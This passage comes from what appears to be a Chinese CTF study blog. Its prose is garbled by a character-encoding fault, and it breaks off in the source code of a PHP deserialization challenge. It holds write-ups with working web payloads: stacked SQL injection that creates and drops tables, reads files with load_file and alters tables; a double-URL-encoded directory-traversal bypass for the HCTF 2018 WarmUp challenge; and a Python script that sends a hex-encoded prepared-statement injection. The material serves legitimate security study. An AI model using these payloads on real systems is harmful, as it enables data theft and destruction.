<p>åŸä½œè€…è¯´ä¸æ”¯æŒmysql+phpï¼Œ ä½†æ˜¯æˆ‘åœ¨ä½¿ç”¨ <code>php7.0+</code> ç‰ˆæœ¬æ—¶ï¼Œæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œå¤§æ¦‚æ˜¯å’ŒåŸæ–‡ä½œè€…åœ¨ä½¿ç”¨ç¨‹åºç‰ˆæœ¬ä¸åŒçš„åŸå› é€ æˆçš„æƒ…å†µã€‚è™½ç„¶å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤è¯­å¥ï¼Œä½†æ˜¯æ­¤ç§æ³¨å…¥æ–¹å¼å¹¶ä¸æ˜¯ä¸‡èƒ½çš„ã€‚åœ¨webç³»ç»Ÿä¸­ï¼Œä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤å †å æ³¨å…¥çš„ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœä¼šè¢«å¿½ç•¥ï¼Œåœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰æ³¨å…¥ã€‚åŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œä¾‹å¦‚è¡¨åï¼Œåˆ—åç­‰ä¿¡æ¯ã€‚</p>
<hr>
<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="ï¼ˆ1ï¼‰æ–°å»ºä¸€ä¸ªè¡¨"><a href="#ï¼ˆ1ï¼‰æ–°å»ºä¸€ä¸ªè¡¨" class="headerlink" title="ï¼ˆ1ï¼‰æ–°å»ºä¸€ä¸ªè¡¨"></a>ï¼ˆ1ï¼‰æ–°å»ºä¸€ä¸ªè¡¨</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> Sno = <span class="number">1</span>; <span class="keyword">create</span> <span class="keyword">table</span> test1 <span class="keyword">like</span> student;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mks5zj30t30a5jt5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mks5zj30t30a5jt5.jpg" class="lazyload" title="test"></a></p>
<p>æ‰§è¡ŒæˆåŠŸï¼Œæˆ‘ä»¬å†å»çœ‹ä¸€ä¸‹æ˜¯å¦æ–°å»ºæˆåŠŸè¡¨ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mkunrj30sd0byjt9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mkunrj30sd0byjt9.jpg" class="lazyload" title="test"></a></p>
<p>å‘ç°å­˜åœ¨æ–°å»ºçš„è¡¨ <code>test1</code>ï¼›</p>
<hr>
<h4 id="ï¼ˆ2ï¼‰åˆ é™¤è¡¨"><a href="#ï¼ˆ2ï¼‰åˆ é™¤è¡¨" class="headerlink" title="ï¼ˆ2ï¼‰åˆ é™¤è¡¨"></a>ï¼ˆ2ï¼‰åˆ é™¤è¡¨</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> Sno = <span class="number">1</span>; <span class="keyword">drop</span> <span class="keyword">table</span> test1;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mi0s6j30nz06xt97.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mi0s6j30nz06xt97.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹è¡¨ï¼Œ å‘ç°test1 å·²è¢«åˆ é™¤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mj4y3j30mm06074v.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mj4y3j30mm06074v.jpg" class="lazyload" title="test"></a></p>
<hr>
<h4 id="ï¼ˆ3ï¼‰æŸ¥è¯¢æ•°æ®"><a href="#ï¼ˆ3ï¼‰æŸ¥è¯¢æ•°æ®" class="headerlink" title="ï¼ˆ3ï¼‰æŸ¥è¯¢æ•°æ®"></a>ï¼ˆ3ï¼‰æŸ¥è¯¢æ•°æ®</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> Sno=<span class="number">1</span>; <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mm4kxj30o2052mxj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mm4kxj30o2052mxj.jpg" class="lazyload" title="test"></a><br>PS: result1 è¿˜æ˜¯æ­£å¸¸æŸ¥è¯¢</p>
<hr>
<h4 id="ï¼ˆ4ï¼‰åŠ è½½æ–‡ä»¶"><a href="#ï¼ˆ4ï¼‰åŠ è½½æ–‡ä»¶" class="headerlink" title="ï¼ˆ4ï¼‰åŠ è½½æ–‡ä»¶"></a>ï¼ˆ4ï¼‰åŠ è½½æ–‡ä»¶</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> Sno=<span class="number">1</span>; <span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'D:/phpstudy/PHPTutorial/WWW/flag.php'</span>);</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" class="lazyload" title="test"></a></p>
<hr>
<h4 id="5-ä¿®æ”¹æ•°æ®"><a href="#5-ä¿®æ”¹æ•°æ®" class="headerlink" title="(5)ä¿®æ”¹æ•°æ®"></a>(5)ä¿®æ”¹æ•°æ®</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> Sno=<span class="number">1</span>;<span class="keyword">insert</span> <span class="keyword">into</span> student(Sno,Sname,Sex, Age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">'100'</span>,<span class="string">'test'</span>,<span class="string">'ma'</span>,<span class="string">'18'</span>);</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mms7zj30zb0500ts.jpg" class="lazyload" title="test"></a></p>
<p>å¯ä»¥çœ‹åˆ°åˆšåˆšæ·»åŠ çš„æ•°æ®</p>
<hr>
<p>é™¤äº†<code>mysql</code>ï¼Œ<code>Postgresql</code>ï¼Œ <code>SQL server</code> åŒæ ·å¯ä»¥è¿›è¡Œå †å æ³¨å…¥ï¼Œ<code>Oracle</code>ä¸è¡Œï¼Œå…·ä½“æ“ä½œéƒ½ä¸€æ ·</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Buuctf day1</title>
    <url>/yakko117/2019/10/21/BuuctfDay1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><p>æ–°é¢˜æ”¶å½•æŒºå¤šçš„ï¼Œå¥½å¥½åšå¥½å¥½å­¦</p>
<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>åæ¥çœ‹äº†ä¸‹ï¼Œé¢˜ç›®åŸå‹æ˜¯phpmyadmin4.8.1çš„ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´<br>CVE-2018-12613<br>æ‰“å¼€é¡µé¢ï¼ŒæŸ¥çœ‹æºç å‘ç° <code>source.php</code>ï¼Œ ç„¶åå‘ç° <code>hint.php</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqho5ij30ns02laa1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqho5ij30ns02laa1.jpg" class="lazyload" title="test"></a></p>
<p>å®¡è®¡ <code>source.php</code> å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8561ybbvuj30qn0hp0tt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8561ybbvuj30qn0hp0tt.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="source-php-æºç "><a href="#source-php-æºç " class="headerlink" title="source.php æºç "></a>source.php æºç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>åˆ†æä¸€ä¸‹ <code>checkFile()</code>å‡½æ•°ï¼š</p>
<ol>
<li>é¦–å…ˆè®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼ŒåªåŒ…å«<code>source.php</code> å’Œ<code>hint.php</code><br>ç¬¬ä¸€ä¸ªifæ£€æŸ¥æ˜¯å¦å­˜åœ¨ <code>$page</code> å¹¶ä¸”æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ã€‚</li>
<li>æ£€æŸ¥<code>$page</code>æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œæ˜¯çš„è¯è¿”å›trueã€‚<br>æ¥ä¸‹æ¥ï¼Œä¸¤ä¸ªå‡½æ•°ä¸€ä¸ª<code>mb_substr</code>å’Œ<code>mb_strpos</code>ï¼Œå½“æˆªå–å˜é‡pageä¸­?å‰é¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åå†è¿›è¡Œç™½åå•æ ¡éªŒã€‚</li>
<li>è€ƒè™‘äº†URLç¼–ç çš„ç¼˜æ•…ï¼Œå†ä¸€æ¬¡è§£ç ä¹‹åï¼Œè¿›è¡Œæ ¡éªŒã€‚</li>
</ol>
<p>ä¼ é€’ä¸€ä¸ªå‚æ•° <code>file=source.php?/../../../../../../ffffllllaaaagggg</code>ï¼Œè¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¿˜è¦æŠŠ?è¿›è¡Œä¸¤æ¬¡urlç¼–ç ï¼Œæ‰€ä»¥æœ€åçš„payload<br><code>file=source.php%253f/../../../../../../ffffllllaaaagggg</code></p>
<p>ç¬¬ä¸€æ¬¡éªŒè¯ä»…ä»…åˆ¤æ–­ç™½åå•<br>ç¬¬äºŒæ¬¡æˆªå–å®Œä¹Ÿè¿‡ä¸äº†<br>ç¬¬ä¸‰æ¬¡ï¼Œç»è¿‡urlè§£ç ä¹‹åï¼Œæˆ‘ä»¬æ„é€ çš„payloadå°±å˜æˆäº† <code>source.php?/../../../../../../ffffllllaaaagggg</code>ï¼Œå¾ˆæ˜¾ç„¶ï¼Œå®ƒæ˜¯æˆªå–?å‰é¢çš„è¿›è¡Œæ ¡éªŒï¼Œ<code>source.php</code>åœ¨ç™½åå•ä¸­ï¼Œæ‰€ä»¥è¿”å›trueï¼Œæœ€åé€šè¿‡ç›®å½•ç©¿è¶Šçš„åˆ° <code>ffffllllaaaagggg</code> é¡µé¢ï¼Œä¹Ÿå°±æ˜¯flagã€‚</p>
<hr>
<p>##[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk04mj312a06udgd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk04mj312a06udgd.jpg" class="lazyload" title="test"></a></p>
<p>è¿™é‡Œé¦–å…ˆæäº¤ <code>1</code>ï¼Œè¿™é‡Œå›æ˜¾çš„1å¯¹åº”çš„æ•°æ®<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk6moj310n0a8aaw.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk6moj310n0a8aaw.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åæäº¤ <code>1&#39;</code>ï¼ŒæŠ¥é”™äº†<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlno8j30ub06tt9f.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlno8j30ub06tt9f.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°è¯•<code>1&#39; or &#39;&#39;=&#39;</code>ï¼Œ å›æ˜¾æ­£å¸¸</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlftsj31050gv75a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlftsj31050gv75a.jpg" class="lazyload" title="test"></a><br>è¯´æ˜å­˜åœ¨æ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡ŒæŠŠå¸¸è§çš„å…³é”®å­—éƒ½è¿‡æ‰äº†ï¼Œå¹¶ä¸”æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¸¸è§„çš„æŸ¥ç³»ç»Ÿè¡¨ç„¶åæ³¨å…¥çš„æ–¹æ³•è‚¯å®šä¸è¡Œï¼Œè¿™é‡Œå¯ä»¥å°è¯•å †å æ³¨å…¥ã€‚</p>
<p><a href="https://dev.mysql.com/doc/refman/5.5/en/sql-syntax-prepared-statements.html" target="_blank" rel="noopener">å †å æŸ¥è¯¢</a><br><a href="https://blog.csdn.net/lqx_sunhan/article/details/79852063" target="_blank" rel="noopener">åˆ©ç”¨ prepare è°ƒç”¨</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqm7c3j30z406wjs2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqm7c3j30z406wjs2.jpg" class="lazyload" title="test"></a></p>
<p>å°è¯•ä½¿ç”¨ <code>?inject=1%27;show tables;</code> å¾—åˆ°è¡¨åï¼Œå¾—åˆ°ä¸¤å¼ è¡¨<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqpcnhj310m0hdmy8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqpcnhj310m0hdmy8.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶å <code>show coloums from</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xs8b2j30e501jdfn.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xs8b2j30e501jdfn.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹ä¸€ä¸‹ <code>words</code> è¡¨<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xww7kj310o0rkq4k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xww7kj310o0rkq4k.jpg" class="lazyload" title="test"></a><br>å¯ä»¥çœ‹åˆ°å­˜åœ¨flag </p>
<p>ä½¿ç”¨ <code>show create table xxxx;</code> è¯­å¥ä¹Ÿå¯ä»¥æŸ¥åˆ°è¡¨çš„ç»“æ„ã€‚<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xp8xwj30zt0fjjso.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xp8xwj30zt0fjjso.jpg" class="lazyload" title="test"></a></p>
<p>å› ä¸ºåç«¯æ•°æ®åº“å®é™…ä¸Šæ˜¯æŸ¥è¯¢çš„wordsè¡¨ï¼Œå¯ä»¥ä½¿ç”¨alteræ¥æ›´æ”¹è¡¨åå’Œè¡¨å­—æ®µï¼Œè®©1919810931114514çš„è¡¨æ›´åä¸ºwordsè¡¨ï¼Œé‚£ä¹ˆæŸ¥è¯¢çš„wordsçš„æ—¶å€™å®é™…ä¸Šæ˜¯å¯¹19è¿™å¼ è¡¨çš„æŸ¥è¯¢ï¼Œ</p>
<p>æ€è·¯å°±æ˜¯æŠŠ <code>1919810931114514</code> æ”¹æˆ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">words, alter table words rename xxx;alter table &#96;1919810931114514&#96;rename words;</span><br><span class="line"></span><br><span class="line">è¿™é‡Œå¯ä»¥æŠŠ flag åˆ—æ”¹ä¸º idï¼Œæˆ–è€…å•ç‹¬åŠ ä¸€ä¸ª id åˆ—ã€‚</span><br><span class="line"></span><br><span class="line">ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br><span class="line"></span><br><span class="line">alter table &#96;words&#96; add(id int default 1);</span><br><span class="line"></span><br><span class="line">æˆ–è€… </span><br><span class="line">&#39;;alter table &#96;1919810931114514&#96; add(id int default 1);alter table words rename xxx;alter table &#96;1919810931114514&#96; rename words;#</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xwutcj313c097t9l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xwutcj313c097t9l.jpg" class="lazyload" title="test"></a><br>ç„¶åå°±å¯ä»¥ç›´æ¥æŸ¥çœ‹äº†<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xxi1hj30q50a5js0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xxi1hj30q50a5js0.jpg" class="lazyload" title="test"></a><br><a href="https://altman.vip/2019/05/27/QWB2019-writeup/#éšä¾¿æ³¨" target="_blank" rel="noopener">å‚è€ƒäº†å¸ˆå‚…çš„wp</a></p>
<h3 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h3><p>åŒæ—¶ä¹Ÿçœ‹åˆ°äº†åƒè¿™æ ·çš„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">#1919810931114514</span><br><span class="line">part_url&#x3D;&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;?inject&#x3D;&#39;</span><br><span class="line">payload&#x3D;&quot;select flag from &#96;1919810931114514&#96;;&quot;</span><br><span class="line">payload&#x3D;payload.encode(&#39;hex&#39;)</span><br><span class="line">payload&#x3D;&#39;&#39;&#39;1&#39;;Set @x&#x3D;0x&#39;&#39;&#39;+str(payload)+&#39;&#39;&#39;;Prepare a from @x;execute a;%23&#39;&#39;&#39;</span><br><span class="line">print payload</span><br><span class="line">full_url&#x3D;part_url+payload</span><br><span class="line">r&#x3D;requests.get(url&#x3D;full_url)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure></div>
<p>å…ˆç¼–è¯‘sqlè¯­å¥ï¼Œè¿™é‡Œå°†payloadè¿›è¡Œäº†16è¿›åˆ¶ç¼–ç ï¼Œç„¶åä½¿ç”¨executeæ¥è¿›è¡Œæ‰§è¡Œï¼Œè¿™é‡Œ16è¿›åˆ¶ç¼–ç çš„payloadåœ¨ç¼–è¯‘ä¸­å¯ä»¥è¯†åˆ«å‡ºæ¥çš„ï¼Œåˆå­¦åˆ°äº†ã€‚</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2019å®‰æ’ä¸€æœˆèµ›ååºåˆ—åŒ–é¢˜å¤ç°åˆ†æ</title>
    <url>/yakko117/2019/10/16/2019%E5%AE%89%E6%81%921%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h1><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼š</p>
<ul>
<li>PHPååºåˆ—åŒ–</li>
<li>PHPé­”æœ¯æ–¹æ³•</li>
<li>POPé“¾æ„é€ <br>ç”±äºæœ¬äººåªä¼šä¸€ç‚¹ååºåˆ—åŒ–ï¼ŒPOPé“¾æ„é€ ä¹Ÿæ²¡å­¦ä¹ è¿‡<br>å› æ­¤å°è¯•æŠŠè¿™é“é¢˜å¤ç°ä¸€ä¸‹ï¼Œè®°å½•ä¸‹è¿™æ¬¡å­¦ä¹ åˆ†æçš„è¿‡ç¨‹<br><a href="https://www.anquanke.com/post/id/170341" target="_blank" rel="noopener">é£˜é›¶å¸ˆå‚…çš„wp</a></li>
</ul>
<h2 id="æºç å¦‚ä¸‹"><a href="#æºç å¦‚ä¸‹" class="headerlink" title="æºç å¦‚ä¸‹"></a>æºç å¦‚ä¸‹</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span 